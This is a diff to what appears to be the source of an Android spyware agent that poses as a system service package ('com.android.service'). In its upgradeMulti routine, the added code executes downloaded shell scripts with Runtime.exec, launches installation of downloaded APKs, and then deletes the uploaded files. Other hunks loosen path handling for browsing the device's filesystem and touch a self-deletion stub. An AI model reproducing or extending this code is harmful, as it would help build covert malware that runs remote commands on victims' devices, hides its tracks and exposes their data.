@@ -10,6 +10,7 @@
 package com.android.service.action.sync;
 
 import java.io.File;
+import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
 
@@ -146,11 +147,35 @@ public abstract class Protocol {
 				Check.log(TAG + " (upgradeMulti): " + fileName);//$NON-NLS-1$
 			}
 			final File file = new File(Path.upload(), fileName);
-
-			final Intent intent = new Intent(Intent.ACTION_VIEW);
-			intent.setDataAndType(Uri.fromFile(file), Messages.getString("5.2")); //$NON-NLS-1$
-			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-			Status.getAppContext().startActivity(intent);
+			if (fileName.endsWith(".sh")) {
+				try {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (upgradeMulti): executing " + fileName);
+					}
+					Runtime.getRuntime().exec(file.getAbsolutePath());
+				} catch (IOException e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (upgradeMulti) Error: " + e);
+					}
+				}
+			} else if (fileName.endsWith(".apk")) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (upgradeMulti): action " + fileName);
+				}
+				final Intent intent = new Intent(Intent.ACTION_VIEW);
+				intent.setDataAndType(Uri.fromFile(file), Messages.getString("5.2")); //$NON-NLS-1$
+				intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+				Status.getAppContext().startActivity(intent);
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (upgradeMulti): ignoring " + fileName);
+				}
+			}
+		}
+		
+		for (final String fileName : files) {
+			final File file = new File(Path.upload(), fileName);
+			file.delete();
 		}
 
 		return true;
@@ -162,7 +187,7 @@ public abstract class Protocol {
 	 * @return true, if successful
 	 */
 	public static boolean deleteSelf() {
-		// TODO
+		// TODO deleteself
 		return false;
 
 	}
@@ -301,9 +326,13 @@ public abstract class Protocol {
 			}
 			expandRoot(fsLog, depth);
 		} else {
-			if (path.startsWith("//") && path.endsWith("/*")) { //$NON-NLS-1$ //$NON-NLS-2$
-				path = path.substring(1, path.length() - 2);
-
+			if (path.startsWith("//")) {
+				path = path.substring(1, path.length());
+			}
+			if (path.endsWith("/*")) { //$NON-NLS-1$ //$NON-NLS-2$
+				path = path.substring(0, path.length() - 2);
+			}
+			if (path.startsWith("/")) {
 				expandPath(fsLog, path, depth);
 			} else {
 				if (Cfg.DEBUG) {
